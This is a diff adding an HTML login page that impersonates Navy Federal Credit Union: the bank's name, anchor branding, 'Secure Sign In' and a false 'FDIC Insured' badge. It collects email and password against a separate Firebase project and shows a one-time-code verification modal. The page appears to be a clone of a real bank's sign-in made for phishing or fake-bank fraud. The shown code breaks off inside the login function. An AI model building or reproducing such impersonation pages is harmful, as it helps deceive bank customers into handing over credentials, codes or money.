@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In – Navy Federal Credit Union</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+  <!-- Firebase -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword, sendPasswordResetEmail, signOut } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyD_yrAE0WCnNPjc_2FZ4ZhLG2AJRFA6V2c",
+      authDomain: "navy-credit-union-2f63d.firebaseapp.com",
+      projectId: "navy-credit-union-2f63d",
+      storageBucket: "navy-credit-union-2f63d.firebasestorage.app",
+      messagingSenderId: "176577787303",
+      appId: "1:176577787303:web:7281f340b470daeb45f282",
+      databaseURL: "https://navy-credit-union-2f63d-default-rtdb.firebaseio.com"
+    };
+
+    const app  = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db   = getDatabase(app);
+
+    // Always sign out any existing session when the login page loads,
+    // so returning users and new users always see the login form.
+    signOut(auth);
+
+    window._loginReady = { auth, db, ref, get, signInWithEmailAndPassword, sendPasswordResetEmail };
+  </script>
+
+  <style>
+    :root {
+      --navy: #002147; --navy-mid: #003366;
+      --teal: #00857C; --teal-light: #00A896;
+      --gold: #C9A84C; --cream: #F8F5F0;
+    }
+    *{ margin:0;padding:0;box-sizing:border-box; }
+    body{ font-family:'DM Sans',sans-serif; overflow-x:hidden; }
+
+    /* PRELOADER */
+    #preloader{
+      position:fixed;inset:0;z-index:9999;background:var(--navy);
+      display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2rem;
+      transition:opacity 0.7s ease,visibility 0.7s ease;
+    }
+    #preloader.hide{opacity:0;visibility:hidden;pointer-events:none;}
+    .progress-wrap{width:220px;height:2px;background:rgba(255,255,255,0.15);border-radius:99px;overflow:hidden;}
+    .progress-bar {height:100%;width:0%;background:linear-gradient(90deg,var(--teal),var(--gold));border-radius:99px;animation:load 2.2s cubic-bezier(.4,0,.2,1) forwards;}
+    .loader-brand{font-family:'Playfair Display',serif;font-size:1.1rem;letter-spacing:0.15em;color:white;text-transform:uppercase;}
+    .loader-sub  {font-size:0.65rem;letter-spacing:0.3em;color:var(--gold);text-transform:uppercase;}
+    .loader-anchor{width:60px;height:60px;animation:anchorSpin 2s cubic-bezier(.6,0,.4,1) infinite;}
+    .progress-label{font-size:0.7rem;letter-spacing:0.2em;color:rgba(255,255,255,0.4);animation:fadeInDown 0.8s 0.3s ease forwards;opacity:0;}
+    #site{opacity:0;transition:opacity 0.7s ease 0.1s;}
+    #site.show{opacity:1;}
+
+    @keyframes load{0%{width:0%}80%{width:90%}100%{width:100%}}
+    @keyframes anchorSpin{0%{transform:translateY(0) rotate(0deg)}25%{transform:translateY(-8px) rotate(-10deg)}75%{transform:translateY(4px) rotate(10deg)}100%{transform:translateY(0) rotate(0deg)}}
+    @keyframes fadeInDown{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
+    @keyframes fadeInUp  {from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)}}
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-18px)}}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    @keyframes shimmer{0%{background-position:200% center}100%{background-position:-200% center}}
+
+    /* NAV */
+    nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(0,33,71,0.97);backdrop-filter:blur(12px);box-shadow:0 2px 20px rgba(0,0,0,0.3);}
+    .nav-inner{max-width:1280px;margin:0 auto;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between;height:68px;}
+    .nav-logo{display:flex;align-items:center;gap:0.6rem;text-decoration:none;}
+    .nav-brand{font-family:'Playfair Display',serif;color:white;font-size:0.95rem;letter-spacing:0.04em;line-height:1.2;}
+    .nav-brand span{display:block;font-size:0.6rem;letter-spacing:0.18em;color:var(--gold);font-family:'DM Sans',sans-serif;font-weight:500;}
+    .btn-register{background:var(--teal);color:white;font-size:0.82rem;font-weight:600;padding:0.5rem 1.1rem;border-radius:7px;border:none;cursor:pointer;transition:background 0.2s;text-decoration:none;display:inline-block;}
+    .btn-register:hover{background:var(--teal-light);}
+
+    /* MAIN */
+    .page-bg{
+      min-height:100vh;padding-top:68px;
+      background:linear-gradient(160deg,#001830 0%,#002147 40%,#003a2a 100%);
+      display:flex;align-items:center;justify-content:center;
+      padding-bottom:3rem;position:relative;overflow:hidden;
+    }
+    .bokeh{position:absolute;border-radius:50%;filter:blur(80px);opacity:0.18;animation:float 9s ease-in-out infinite;}
+    .b1{width:500px;height:500px;background:var(--teal);top:-100px;right:-100px;animation-delay:0s;}
+    .b2{width:350px;height:350px;background:var(--navy-mid);bottom:-60px;left:-80px;animation-delay:-4s;}
+    .b3{width:250px;height:250px;background:var(--gold);top:40%;right:20%;animation-delay:-6s;opacity:0.07;}
+
+    .login-wrap{position:relative;z-index:2;width:100%;max-width:460px;padding:0 1rem;}
+
+    /* CARD */
+    .login-card{background:rgba(255,255,255,0.97);border-radius:24px;overflow:hidden;box-shadow:0 40px 120px rgba(0,0,0,0.4);animation:fadeInUp 0.7s ease forwards;}
+
+    .card-top{background:linear-gradient(135deg,var(--navy),var(--navy-mid));padding:2rem 2rem 1.75rem;text-align:center;position:relative;overflow:hidden;}
+    .card-top::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 80% at 50% 0%,rgba(0,133,124,0.25) 0%,transparent 70%);}
+    .card-top-badge{position:relative;display:inline-flex;align-items:center;gap:0.4rem;background:rgba(201,168,76,0.15);border:1px solid rgba(201,168,76,0.3);border-radius:99px;padding:0.28rem 0.75rem;margin-bottom:1rem;}
+    .card-top-badge span{font-size:0.67rem;letter-spacing:0.1em;color:var(--gold);font-weight:600;text-transform:uppercase;}
+    .card-top h2{position:relative;font-family:'Playfair Display',serif;color:white;font-size:1.7rem;margin-bottom:0.4rem;}
+    .card-top p{position:relative;font-size:0.83rem;color:rgba(255,255,255,0.6);}
+
+    .lock-icon-wrap{width:64px;height:64px;border-radius:50%;margin:0 auto 1rem;background:rgba(0,133,124,0.15);border:2px solid rgba(0,168,150,0.3);display:flex;align-items:center;justify-content:center;}
+    .lock-icon-wrap svg{width:30px;height:30px;color:var(--teal-light);}
+
+    .card-body{padding:2rem 2rem 2.5rem;}
+
+    /* views */
+    .view{display:none;}
+    .view.active{display:block;animation:fadeInUp 0.35s ease forwards;}
+
+    /* form */
+    .field{margin-bottom:1.1rem;}
+    .field label{display:block;font-size:0.78rem;font-weight:600;color:var(--navy);margin-bottom:0.4rem;letter-spacing:0.02em;}
+    .inp-wrap{position:relative;}
+    .inp-icon{position:absolute;left:0.9rem;top:50%;transform:translateY(-50%);width:18px;height:18px;color:#9ca3af;pointer-events:none;}
+    .inp-wrap input{width:100%;padding:0.78rem 2.6rem 0.78rem 2.6rem;border:1.5px solid #e5e7eb;border-radius:10px;font-size:0.88rem;font-family:'DM Sans',sans-serif;color:var(--navy);transition:border-color 0.2s,box-shadow 0.2s;}
+    .inp-wrap input:focus{outline:none;border-color:var(--teal);box-shadow:0 0 0 3px rgba(0,133,124,0.12);}
+    .field-error{font-size:0.73rem;color:#ef4444;margin-top:0.3rem;display:none;}
+    .field-error.show{display:block;}
+
+    /* password toggle */
+    .pwd-toggle{position:absolute;right:0.9rem;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#9ca3af;padding:0;display:flex;align-items:center;}
+    .pwd-toggle:hover{color:var(--navy);}
+
+    .forgot-link{display:block;text-align:right;font-size:0.75rem;color:var(--teal);font-weight:600;text-decoration:none;margin-top:-0.5rem;margin-bottom:1.1rem;cursor:pointer;}
+    .forgot-link:hover{text-decoration:underline;}
+
+    .btn-primary{width:100%;padding:0.88rem;background:linear-gradient(135deg,var(--navy),var(--navy-mid));color:white;font-size:0.92rem;font-weight:600;border:none;border-radius:12px;cursor:pointer;letter-spacing:0.04em;transition:transform 0.2s,box-shadow 0.2s;display:flex;align-items:center;justify-content:center;gap:0.5rem;}
+    .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,33,71,0.3);}
+    .btn-primary:disabled{opacity:0.7;cursor:not-allowed;transform:none;}
+    .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite;display:none;}
+    .btn-primary.loading .spinner{display:block;}
+    .btn-primary.loading .btn-text{opacity:0.5;}
+
+    .divider{display:flex;align-items:center;gap:0.75rem;margin:1.25rem 0;}
+    .divider span{font-size:0.75rem;color:#9ca3af;white-space:nowrap;}
+    .divider::before,.divider::after{content:'';flex:1;height:1px;background:#e5e7eb;}
+
+    .sign-up-link{text-align:center;font-size:0.82rem;color:#6b7280;}
+    .sign-up-link a{color:var(--teal);font-weight:600;text-decoration:none;}
+
+    /* FORGOT PASSWORD VIEW */
+    .view-icon{width:72px;height:72px;border-radius:50%;margin:0 auto 1.25rem;background:linear-gradient(135deg,rgba(0,133,124,0.1),rgba(0,168,150,0.06));border:2px solid rgba(0,133,124,0.2);display:flex;align-items:center;justify-content:center;}
+    .view-icon svg{width:34px;height:34px;color:var(--teal);}
+    .view-title{font-family:'Playfair Display',serif;font-size:1.4rem;color:var(--navy);text-align:center;margin-bottom:0.5rem;}
+    .view-sub{font-size:0.84rem;color:#6b7280;text-align:center;line-height:1.7;margin-bottom:1.5rem;}
+
+    .sent-email-chip{display:inline-flex;align-items:center;gap:0.4rem;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:99px;padding:0.3rem 0.85rem;font-size:0.78rem;color:#166534;font-weight:600;margin:0 auto 1.25rem;width:fit-content;}
+    .sent-note{background:rgba(201,168,76,0.08);border:1px solid rgba(201,168,76,0.25);border-radius:10px;padding:0.85rem 1rem;font-size:0.78rem;color:#92400e;line-height:1.6;margin-bottom:1.5rem;}
+
+    .btn-outline{width:100%;padding:0.8rem;background:transparent;color:var(--navy);font-size:0.88rem;font-weight:500;border:1.5px solid #e5e7eb;border-radius:12px;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:0.5rem;margin-bottom:0.75rem;}
+    .btn-outline:hover{border-color:var(--teal);color:var(--teal);background:rgba(0,133,124,0.04);}
+
+    .btn-back{width:100%;text-align:center;font-size:0.82rem;color:#6b7280;background:none;border:none;cursor:pointer;padding:0.5rem;transition:color 0.2s;display:block;}
+    .btn-back:hover{color:var(--navy);}
+
+    /* security row */
+    .security-row{display:flex;align-items:center;justify-content:center;gap:1.5rem;margin-top:1.5rem;flex-wrap:wrap;}
+    .sec-badge{display:flex;align-items:center;gap:0.4rem;font-size:0.7rem;color:#9ca3af;}
+    .sec-badge svg{width:13px;height:13px;color:#22c55e;}
+
+    /* toast */
+    .toast{position:fixed;bottom:2rem;left:50%;transform:translateX(-50%) translateY(100px);background:var(--navy);color:white;padding:0.75rem 1.5rem;border-radius:12px;font-size:0.85rem;font-weight:500;box-shadow:0 8px 30px rgba(0,0,0,0.3);z-index:9999;transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1);}
+    .toast.show{transform:translateX(-50%) translateY(0);}
+    .toast.error{background:#dc2626;}
+    .toast.success{background:var(--teal);}
+
+    /* 2FA MODAL OVERLAY */
+    #mfaOverlay{
+      position:fixed;inset:0;z-index:10000;
+      background:rgba(0,20,50,0.75);backdrop-filter:blur(6px);
+      display:flex;align-items:center;justify-content:center;padding:1rem;
+      opacity:0;visibility:hidden;transition:opacity 0.3s ease,visibility 0.3s ease;
+    }
+    #mfaOverlay.show{opacity:1;visibility:visible;}
+    .mfa-card{
+      background:#fff;border-radius:22px;width:100%;max-width:420px;
+      box-shadow:0 40px 100px rgba(0,0,0,0.5);
+      overflow:hidden;transform:scale(0.93) translateY(20px);
+      transition:transform 0.35s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    #mfaOverlay.show .mfa-card{transform:scale(1) translateY(0);}
+    .mfa-top{background:linear-gradient(135deg,var(--navy),var(--navy-mid));padding:1.75rem 2rem 1.5rem;text-align:center;position:relative;overflow:hidden;}
+    .mfa-top::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 80% at 50% 0%,rgba(0,133,124,0.25) 0%,transparent 70%);}
+    .mfa-shield{position:relative;width:58px;height:58px;border-radius:50%;margin:0 auto 0.9rem;background:rgba(0,133,124,0.15);border:2px solid rgba(0,168,150,0.35);display:flex;align-items:center;justify-content:center;}
+    .mfa-shield svg{width:28px;height:28px;color:var(--teal-light);}
+    .mfa-top h3{position:relative;font-family:'Playfair Display',serif;color:white;font-size:1.45rem;margin-bottom:0.3rem;}
+    .mfa-top p{position:relative;font-size:0.8rem;color:rgba(255,255,255,0.6);line-height:1.5;}
+    .mfa-body{padding:1.75rem 2rem 2rem;}
+
+    /* Timer ring */
+    .timer-wrap{display:flex;align-items:center;justify-content:center;margin-bottom:1.5rem;}
+    .timer-ring{position:relative;width:80px;height:80px;}
+    .timer-ring svg{transform:rotate(-90deg);}
+    .timer-ring circle{transition:stroke-dashoffset 1s linear;fill:none;}
+    .timer-bg{stroke:#e5e7eb;stroke-width:5;}
+    .timer-fg{stroke:var(--teal);stroke-width:5;stroke-linecap:round;stroke-dasharray:219.9;stroke-dashoffset:0;}
+    .timer-fg.urgent{stroke:#ef4444;}
+    .timer-label{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;}
+    .timer-mm-ss{font-size:1.1rem;font-weight:700;color:var(--navy);letter-spacing:0.02em;line-height:1;}
+    .timer-text{font-size:0.58rem;color:#9ca3af;text-transform:uppercase;letter-spacing:0.1em;margin-top:2px;}
+    .timer-expired-txt{font-size:0.85rem;color:#ef4444;font-weight:600;text-align:center;margin-bottom:1.5rem;display:none;}
+
+    /* OTP input */
+    .otp-inputs{display:flex;gap:0.6rem;justify-content:center;margin-bottom:1.4rem;}
+    .otp-inputs input{
+      width:46px;height:54px;text-align:center;font-size:1.35rem;font-weight:700;
+      border:2px solid #e5e7eb;border-radius:10px;color:var(--navy);
+      font-family:'DM Sans',sans-serif;transition:border-color 0.2s,box-shadow 0.2s;
+      background:#fafafa;
+    }
+    .otp-inputs input:focus{outline:none;border-color:var(--teal);box-shadow:0 0 0 3px rgba(0,133,124,0.13);background:#fff;}
+    .otp-inputs input.filled{border-color:var(--teal);background:#fff;}
+    .otp-inputs input.error{border-color:#ef4444!important;box-shadow:0 0 0 3px rgba(239,68,68,0.13)!important;}
+    .otp-hint{font-size:0.76rem;color:#6b7280;text-align:center;margin-bottom:1.3rem;line-height:1.6;}
+    .otp-error{font-size:0.78rem;color:#ef4444;text-align:center;margin-bottom:1rem;display:none;font-weight:500;}
+    .otp-error.show{display:block;}
+    .mfa-info-note{
+      background:rgba(0,133,124,0.06);border:1px solid rgba(0,133,124,0.18);
+      border-radius:10px;padding:0.75rem 1rem;font-size:0.76rem;color:#374151;
+      line-height:1.6;margin-bottom:1.4rem;display:flex;gap:0.5rem;align-items:flex-start;
+    }
+    .mfa-info-note svg{flex-shrink:0;width:15px;height:15px;color:var(--teal);margin-top:1px;}
+  </style>
+</head>
+<body>
+
+<!-- PRELOADER -->
+<div id="preloader">
+  <div style="display:flex;flex-direction:column;align-items:center;gap:0.5rem;">
+    <svg class="loader-anchor" viewBox="0 0 60 60" fill="none">
+      <circle cx="30" cy="12" r="7" stroke="#C9A84C" stroke-width="2.5"/>
+      <line x1="30" y1="19" x2="30" y2="48" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+      <path d="M16 38 Q30 50 44 38" stroke="white" stroke-width="2.5" stroke-linecap="round" fill="none"/>
+      <circle cx="16" cy="38" r="3" fill="#00857C"/>
+      <circle cx="44" cy="38" r="3" fill="#00857C"/>
+    </svg>
+    <div class="loader-brand">Navy Federal</div>
+    <div class="loader-sub">Credit Union</div>
+  </div>
+  <div style="display:flex;flex-direction:column;align-items:center;gap:0.5rem;">
+    <div class="progress-wrap"><div class="progress-bar"></div></div>
+    <div class="progress-label">Establishing secure connection…</div>
+  </div>
+</div>
+
+<div id="site">
+  <nav>
+    <div class="nav-inner">
+      <a href="index.html" class="nav-logo">
+        <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+          <circle cx="18" cy="8" r="5" stroke="#C9A84C" stroke-width="2"/>
+          <line x1="18" y1="13" x2="18" y2="30" stroke="white" stroke-width="2" stroke-linecap="round"/>
+          <path d="M9 24 Q18 32 27 24" stroke="white" stroke-width="2" stroke-linecap="round" fill="none"/>
+          <circle cx="9" cy="24" r="2.5" fill="#00857C"/>
+          <circle cx="27" cy="24" r="2.5" fill="#00857C"/>
+        </svg>
+        <div class="nav-brand">Navy Federal <span>Credit Union</span></div>
+      </a>
+      <a href="register.html" class="btn-register">Open Account</a>
+    </div>
+  </nav>
+
+  <div class="page-bg">
+    <div class="bokeh b1"></div>
+    <div class="bokeh b2"></div>
+    <div class="bokeh b3"></div>
+
+    <div class="login-wrap">
+      <div class="login-card">
+
+        <!-- Card Top -->
+        <div class="card-top">
+          <div class="lock-icon-wrap">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+          </div>
+          <div class="card-top-badge"><span>Secure Sign In</span></div>
+          <h2>Welcome back</h2>
+          <p>Sign in to access your Navy Federal account</p>
+        </div>
+
+        <!-- Card Body -->
+        <div class="card-body">
+
+          <!-- ── VIEW 1: Login form ── -->
+          <div class="view active" id="viewLogin">
+            <div class="field">
+              <label for="loginEmail">Email Address</label>
+              <div class="inp-wrap">
+                <svg class="inp-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                <input type="email" id="loginEmail" placeholder="your@email.com" onkeydown="if(event.key==='Enter')document.getElementById('loginPassword').focus()"/>
+              </div>
+              <div class="field-error" id="err-loginEmail">Please enter a valid email address</div>
+            </div>
+
+            <div class="field">
+              <label for="loginPassword">Password</label>
+              <div class="inp-wrap">
+                <svg class="inp-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                <input type="password" id="loginPassword" placeholder="Enter your password" onkeydown="if(event.key==='Enter')login()"/>
+                <button class="pwd-toggle" type="button" onclick="togglePwd()">
+                  <svg id="eyeIcon" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                  </svg>
+                </button>
+              </div>
+              <div class="field-error" id="err-loginPassword">Please enter your password</div>
+            </div>
+
+            <a class="forgot-link" onclick="switchView('viewForgot')">Forgot password?</a>
+
+            <button class="btn-primary" id="loginBtn" onclick="login()">
+              <div class="spinner"></div>
+              <span class="btn-text">Sign In</span>
+            </button>
+
+            <div class="divider"><span>new to Navy Federal?</span></div>
+            <div class="sign-up-link"><a href="register.html">Open a free account →</a></div>
+
+            <div class="security-row">
+              <div class="sec-badge">
+                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                256-bit SSL
+              </div>
+              <div class="sec-badge">
+                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                FDIC Insured
+              </div>
+            </div>
+          </div>
+
+          <!-- ── VIEW 2: Forgot Password ── -->
+          <div class="view" id="viewForgot">
+            <div class="view-icon">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
+            </div>
+            <h3 class="view-title">Reset your password</h3>
+            <p class="view-sub">Enter the email address on your account and we'll send you a password reset link.</p>
+
+            <div class="field">
+              <label for="resetEmail">Email Address</label>
+              <div class="inp-wrap">
+                <svg class="inp-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                <input type="email" id="resetEmail" placeholder="your@email.com" onkeydown="if(event.key==='Enter')sendReset()"/>
+              </div>
+              <div class="field-error" id="err-resetEmail">Please enter a valid email address</div>
+            </div>
+
+            <button class="btn-primary" id="resetBtn" onclick="sendReset()">
+              <div class="spinner"></div>
+              <span class="btn-text">Send Reset Link</span>
+            </button>
+            <button class="btn-back" onclick="switchView('viewLogin')" style="margin-top:0.75rem;">← Back to sign in</button>
+          </div>
+
+          <!-- ── VIEW 3: Reset Link Sent ── -->
+          <div class="view" id="viewResetSent">
+            <div class="view-icon">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+            </div>
+            <h3 class="view-title">Check your inbox!</h3>
+            <p class="view-sub">We've sent a password reset link to:</p>
+            <div class="sent-email-chip">
+              <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+              <span id="resetEmailDisplay">you@email.com</span>
+            </div>
+            <div class="sent-note">
+              <strong>📬 Check your spam folder too!</strong><br>
+              Click the link in the email to set a new password. The link expires in 1 hour. Once reset, come back here and sign in with your new password.
+            </div>
+            <button class="btn-outline" onclick="switchView('viewLogin')">← Back to sign in</button>
+          </div>
+
+        </div><!-- /card-body -->
+      </div><!-- /login-card -->
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<!-- ══ 2FA MODAL ══ -->
+<div id="mfaOverlay">
+  <div class="mfa-card">
+    <div class="mfa-top">
+      <div class="mfa-shield">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+      </div>
+      <h3>Verify Your Identity</h3>
+      <p>A verification code was sent to your email address</p>
+    </div>
+
+    <div class="mfa-body">
+      <div class="timer-wrap">
+        <div class="timer-ring">
+          <svg width="80" height="80" viewBox="0 0 80 80">
+            <circle class="timer-bg" cx="40" cy="40" r="35"/>
+            <circle class="timer-fg" id="timerCircle" cx="40" cy="40" r="35"/>
+          </svg>
+          <div class="timer-label">
+            <span class="timer-mm-ss" id="timerDisplay">5:00</span>
+            <span class="timer-text">left</span>
+          </div>
+        </div>
+      </div>
+      <div class="timer-expired-txt" id="timerExpiredTxt">&#9200; Code expired. Please sign in again.</div>
+
+      <div class="mfa-info-note">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+        <span>Enter the 6-digit code sent to your registered email. Do not share this code with anyone.</span>
+      </div>
+
+      <div class="otp-inputs" id="otpInputs">
+        <input type="tel" maxlength="1" id="otp0" oninput="otpInput(this,0)" onkeydown="otpKeydown(event,0)" autocomplete="one-time-code"/>
+        <input type="tel" maxlength="1" id="otp1" oninput="otpInput(this,1)" onkeydown="otpKeydown(event,1)"/>
+        <input type="tel" maxlength="1" id="otp2" oninput="otpInput(this,2)" onkeydown="otpKeydown(event,2)"/>
+        <input type="tel" maxlength="1" id="otp3" oninput="otpInput(this,3)" onkeydown="otpKeydown(event,3)"/>
+        <input type="tel" maxlength="1" id="otp4" oninput="otpInput(this,4)" onkeydown="otpKeydown(event,4)"/>
+        <input type="tel" maxlength="1" id="otp5" oninput="otpInput(this,5)" onkeydown="otpKeydown(event,5)"/>
+      </div>
+      <div class="otp-error" id="otpError">Incorrect code. Please try again.</div>
+
+      <button class="btn-primary" id="mfaVerifyBtn" onclick="verifyMfa()">
+        <div class="spinner"></div>
+        <span class="btn-text">Verify &amp; Continue</span>
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+  window.addEventListener('load', () => {
+    setTimeout(()=>{
+      document.getElementById('preloader').classList.add('hide');
+      document.getElementById('site').classList.add('show');
+    }, 2400);
+  });
+
+  // ── TOGGLE PASSWORD VISIBILITY ──
+  function togglePwd() {
+    const inp  = document.getElementById('loginPassword');
+    const icon = document.getElementById('eyeIcon');
+    if(inp.type === 'password') {
+      inp.type = 'text';
+      icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>';
+    } else {
+      inp.type = 'password';
+      icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>';
+    }
+  }
+
+  // ── LOGIN ──
+  async function login() {
+    const emailEl = document.getElementById('loginEmail');
+    const pwdEl   = document.getElementById('loginPassword');
+    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    let ok = true;
+
+    document.getElementById('err-loginEmail').classList.remove('show');
+    document.getElementById('err-loginPassword').classList.remove('show');
+    emailEl.style.borderColor = '';
+    pwdEl.style.borderColor   = '';
+
+    if(!emailRx.test(emailEl.value.trim())) {
+      document.getElementById('err-loginEmail').classList.add('show');
+      emailEl.style.borderColor = '#ef4444';
+      ok = false;
+    }
+    if(!pwdEl.value) {
+      document.getElementById('err-loginPassword').classList.add('show');
+      pwdEl.style.borderColor = '#ef4444';
+      ok = false;
+    }
+    if(!ok) return;
+
+    if(!window._loginReady) { showToast('Firebase not ready yet.', 'error'); return; }
+
+    const btn = document.getElementById('loginBtn');
+    btn.classList.add('loading'); btn.disabled = true;
+
+    const { auth, db, ref, get, signInWithEmailAndPassword } = window._loginReady;
+
+    try {
+      const cred = await signInWithEmailAndPassword(auth, emailEl.value.trim(), pwdEl.value);
+      const uid  = cred.user.uid;
+
+      // Two valid paths to be considered verified:
+      // 1. Admin-created users: have verified:true written to DB directly.
+      // 2. Self-registered users: Firebase Auth emailVerified is true after
+      //    they click the verification link in their email.
+      const snap         = await get(ref(db, `users/${uid}/verified`));
+      const dbVerified   = snap.exists() ? snap.val() : false;
+      await cred.user.reload().catch(() => {});
+      const authVerified = auth.currentUser ? auth.currentUser.emailVerified : false;
+      const verified     = dbVerified || authVerified;
+
+      if(!verified) {
+        showToast('Please verify your email first. Check your inbox.', 'error');
+        await auth.signOut();
+        btn.classList.remove('loading'); btn.disabled = false;
+        return;
+      }
+
+      // Firebase auth success — show 2FA modal
+      btn.classList.remove('loading'); btn.disabled = false;
+      openMfa();
+      return;
+
+    } catch(err) {
